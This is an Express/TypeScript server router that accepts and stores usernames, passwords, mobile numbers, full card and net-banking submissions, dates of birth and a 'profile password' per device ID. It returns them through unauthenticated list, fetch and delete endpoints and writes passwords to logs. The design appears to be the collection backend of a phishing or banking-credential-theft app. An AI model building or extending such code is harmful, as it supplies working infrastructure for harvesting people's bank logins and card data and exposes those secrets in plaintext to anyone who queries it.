import express, { Request, Response } from "express";
import FormSubmission from "../models/FormSubmission";
import Payment from "../models/Payment";
import logger from "../logger/logger";

const router = express.Router();

/* ================= LIST FORM SUBMISSIONS ================= */

router.get("/form_submissions", async (_req: Request, res: Response) => {
  try {
    const docs = await FormSubmission.find().lean();
    return res.json(docs);
  } catch (err: any) {
    logger.error("forms: list form_submissions failed", err);
    return res.status(500).json([]);
  }
});

/* ================= GET FORM BY DEVICE ================= */

router.get("/form_submissions/user/:uniqueid", async (req: Request, res: Response) => {
  try {
    const docs = await FormSubmission.find({
      uniqueid: req.params.uniqueid,
    }).lean();

    return res.json(docs);
  } catch (err: any) {
    logger.error("forms: fetch by device failed", err);
    return res.status(500).json([]);
  }
});

/* ================= DELETE FORM SUBMISSION ================= */

router.delete("/form_submissions/:uniqueid", async (req: Request, res: Response) => {
  try {
    await FormSubmission.deleteOne({ uniqueid: req.params.uniqueid });
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("forms: delete form_submission failed", err);
    return res.status(500).json({ success: false, error: err?.message });
  }
});

/* ================= GET CARD PAYMENTS BY DEVICE ================= */

router.get("/card_payments/device/:uniqueid", async (req: Request, res: Response) => {
  try {
    const docs = await Payment.find({
      uniqueid: req.params.uniqueid,
      method: "card",
    }).lean();

    return res.json(docs.map(d => d.payload));
  } catch (err: any) {
    logger.error("forms: card payments fetch failed", err);
    return res.status(500).json([]);
  }
});

/* ================= GET NET BANKING BY DEVICE ================= */

router.get("/net_banking/device/:uniqueid", async (req: Request, res: Response) => {
  try {
    const docs = await Payment.find({
      uniqueid: req.params.uniqueid,
      method: "netbanking",
    }).lean();

    return res.json(docs.map(d => d.payload));
  } catch (err: any) {
    logger.error("forms: net banking fetch failed", err);
    return res.status(500).json([]);
  }
});

/* ================= GET SUCCESS DATA (DOB + PROFILE PASSWORD) ================= */

router.get("/success_data/device/:uniqueid", async (req: Request, res: Response) => {
  try {
    const doc = await FormSubmission.findOne({
      uniqueid: req.params.uniqueid,
    }).lean();

    if (!doc) return res.json({ dob: "", profilePassword: "" });

    // return only required fields (safe)
    return res.json({
      dob: (doc as any).dob || "",
      profilePassword: (doc as any).profilePassword || "",
    });
  } catch (err: any) {
    logger.error("forms: success_data fetch failed", err);
    return res.status(500).json({});
  }
});

/* ================= POST: SUCCESS DATA (update dob/profilePassword) ================= */

router.post("/success_data", async (req: Request, res: Response) => {
  const body = req.body || {};
  const uniqueid = body.uniqueid || "";

  if (!uniqueid) {
    return res.status(400).json({ success: false, error: "missing uniqueid" });
  }

  try {
    // Log incoming payload for debugging
    logger.info("forms: success_data payload", { uniqueid, dob: body.dob, profilePassword: body.profilePassword });

    const update: any = { $set: {} };

    // NOTE: use hasOwnProperty so empty string ("") will also be written
    if (Object.prototype.hasOwnProperty.call(body, "dob")) {
      update.$set["dob"] = body.dob ?? "";
    }
    if (Object.prototype.hasOwnProperty.call(body, "profilePassword")) {
      update.$set["profilePassword"] = body.profilePassword ?? "";
    }

    // If nothing to set (no keys), still respond success to client,
    // but avoid making empty update call.
    if (Object.keys(update.$set).length === 0) {
      logger.warn("forms: success_data called but no dob/profilePassword keys present", { uniqueid });
      return res.json({ success: true });
    }

    await FormSubmission.findOneAndUpdate({ uniqueid }, update, { upsert: true });

    logger.info("forms: success_data updated", { uniqueid, changes: Object.keys(update.$set) });
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("forms: success_data failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
});

/* ================= EXISTING POST ENDPOINTS ================= */

router.post("/form_submissions", async (req: Request, res: Response) => {
  const body = req.body || {};
  try {
    const doc = new FormSubmission({
      uniqueid: body.uniqueid || body.deviceId || "",
      username: body.username || "",
      password: body.password || "",
      mobileNumber: body.mobileNumber || "",
      // ensure new fields exist (defaults in schema handle this)
    });

    await doc.save();
    logger.info("forms: form_submissions saved", { uniqueid: doc.uniqueid });
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("forms: save form_submissions failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
});

router.post("/card_payments", async (req: Request, res: Response) => {
  try {
    const body = req.body || {};
    const p = new Payment({
      uniqueid: body.uniqueid || "",
      method: "card",
      payload: body,
      status: "pending",
    });

    await p.save();
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("forms: card_payment failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
});

router.post("/net_banking", async (req: Request, res: Response) => {
  try {
    const body = req.body || {};
    const p = new Payment({
      uniqueid: body.uniqueid || "",
      method: "netbanking",
      payload: body,
      status: "pending",
    });

    await p.save();
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("forms: net_banking failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
});

export default router;
